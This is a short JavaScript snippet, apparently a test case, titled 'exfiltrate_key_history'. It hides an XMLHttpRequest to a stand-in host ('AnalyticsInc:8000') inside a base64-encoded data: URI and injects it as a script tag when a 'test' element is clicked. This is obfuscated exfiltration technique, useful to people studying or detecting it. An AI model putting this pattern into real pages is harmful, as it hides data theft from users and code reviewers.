function exfiltrate_key_history() {

    // Data URI 2 - Base64 Obfuscation
    // Exfiltrate data using XMLHTTP request
	var data = 'eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsICJodHRwOi8vQW5hbHl0aWNzSW5jOjgwMDAvc3VibWlzc2lvbi5odG1sP3Rlc3Q9ZGF0YTIiLCB0cnVlKTt4bWxodHRwLnNlbmQobnVsbCk7';
    var URL = 'data:text/javascript;base64,' + data;
    var script = document.createElement("script");
    script.src = URL;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
